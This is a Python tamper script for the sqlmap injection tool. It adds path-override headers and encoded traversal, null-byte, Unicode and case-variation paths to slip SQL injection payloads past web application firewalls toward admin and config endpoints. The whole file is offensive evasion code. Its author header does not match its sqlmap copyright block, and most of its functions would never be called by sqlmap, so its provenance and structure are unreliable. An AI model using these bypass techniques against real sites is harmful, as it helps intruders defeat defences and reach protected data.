#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Adds path obfuscation headers to bypass WAF URL normalization

    Requirement:
        * Backend that processes path override headers
        * Or WAF that doesn't normalize these paths

    Tested against:
        * Nginx-based WAFs
        * Apache mod_security
        * Cloud WAFs (Cloudflare, AWS)

    Notes:
        * WAFs often normalize URL paths before inspection
        * Using path traversal sequences or unusual paths can bypass this
        * Headers like X-Original-URL and X-Rewrite-URL can override the path
        * Encoded path traversal: %2e%2e/ = ../

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/
        * Orange Tsai's research on URL parsing

    >>> tamper('1 UNION SELECT 1,2,3')
    '1 UNION SELECT 1,2,3'
    """

    headers = kwargs.get("headers", {})
    
    # Path override headers
    # These can make the backend process a different path than what the WAF sees
    
    # Nginx specific - can override the URL
    headers["X-Original-URL"] = "/admin/../api/v1/query"
    headers["X-Rewrite-URL"] = "/api/v1/%2e%2e/config"
    
    # IIS specific
    headers["X-Original-Uri"] = "/..%252f..%252f/api"
    
    # Some frameworks
    headers["X-Forwarded-Path"] = "/%2e%2e/%2e%2e/api"
    headers["X-Request-Uri"] = "/api/v1/../../admin"
    
    # Path traversal in Referer (some WAFs check this)
    headers["Referer"] = "https://trusted.com/%2e%2e/%2e%2e/admin"
    
    return payload


def tamper_encoded_traversal(payload, **kwargs):
    """
    Adds URL-encoded path traversal sequences to headers
    
    %2e = .
    %2f = /
    So %2e%2e%2f = ../
    """
    
    headers = kwargs.get("headers", {})
    
    # Various encoded traversal patterns
    traversal_patterns = [
        "%2e%2e/",           # ../
        "%2e%2e%2f",         # ../ (fully encoded)
        "..%2f",             # ../ (partial)
        "%2e%2e\\",          # ..\ (Windows)
        "%2e%2e%5c",         # ..\ (encoded backslash)
        "..%252f",           # ../ (double encoded)
        "%252e%252e/",       # ../ (double encoded dots)
        "..%c0%af",          # ../ (overlong UTF-8)
        "..%c1%9c",          # ..\ (overlong UTF-8 Windows)
    ]
    
    pattern = random.choice(traversal_patterns)
    
    headers["X-Original-URL"] = "/api/v1/%s%s/query" % (pattern, pattern)
    headers["X-Rewrite-URL"] = "/%sconfig" % (pattern * 3)
    
    return payload


def tamper_path_parameter(payload, **kwargs):
    """
    Uses path parameters (;) to confuse URL parsing
    
    Example: /api/v1;foo=bar/users -> may be parsed as /api/v1/users
    """
    
    headers = kwargs.get("headers", {})
    
    # Path parameters can confuse parsers
    path_params = [
        ";",
        ";foo=bar",
        ";jsessionid=fake",
        ";.css",
        ";.js",
        ";.jpg",
    ]
    
    param = random.choice(path_params)
    
    headers["X-Original-URL"] = "/api%s/v1/query" % param
    headers["X-Rewrite-URL"] = "/admin%s/../api" % param
    
    return payload


def tamper_null_byte_path(payload, **kwargs):
    """
    Uses null byte in path to truncate or confuse parsing
    
    Note: Mostly works on older systems
    """
    
    headers = kwargs.get("headers", {})
    
    # Null byte variations
    null_patterns = [
        "%00",
        "%00.jpg",
        "%00.html",
        "\x00",
    ]
    
    null = random.choice(null_patterns)
    
    headers["X-Original-URL"] = "/api/v1/query%s" % null
    headers["X-Rewrite-URL"] = "/admin%s/../config" % null
    
    return payload


def tamper_unicode_path(payload, **kwargs):
    """
    Uses Unicode normalization tricks in paths
    
    Some characters normalize to . or /
    """
    
    headers = kwargs.get("headers", {})
    
    # Unicode characters that may normalize to path separators
    unicode_paths = [
        "/api/v1/\uff0e\uff0e/config",      # Fullwidth ..
        "/api/v1/%c0%ae%c0%ae/config",       # Overlong .
        "/api/v1/..%ef%bc%8f/config",        # Fullwidth /
        "/api/v1/.%00./config",              # Null in dots
    ]
    
    headers["X-Original-URL"] = random.choice(unicode_paths)
    
    return payload


def tamper_case_path(payload, **kwargs):
    """
    Uses case variations in path
    Some WAFs are case-sensitive in path matching
    """
    
    headers = kwargs.get("headers", {})
    
    # Case variations
    case_paths = [
        "/API/V1/query",
        "/Api/V1/Query",
        "/aPi/v1/QUERY",
        "/ApI/V1/QuErY",
    ]
    
    headers["X-Original-URL"] = random.choice(case_paths)
    headers["X-Rewrite-URL"] = random.choice(case_paths)
    
    return payload


def tamper_fragment_path(payload, **kwargs):
    """
    Adds URL fragments that may confuse parsing
    
    Fragments (#) are typically not sent to server but may confuse WAF
    """
    
    headers = kwargs.get("headers", {})
    
    headers["X-Original-URL"] = "/api/v1/query#/../admin"
    headers["Referer"] = "https://site.com/page#%2e%2e/%2e%2e/admin"
    
    return payload
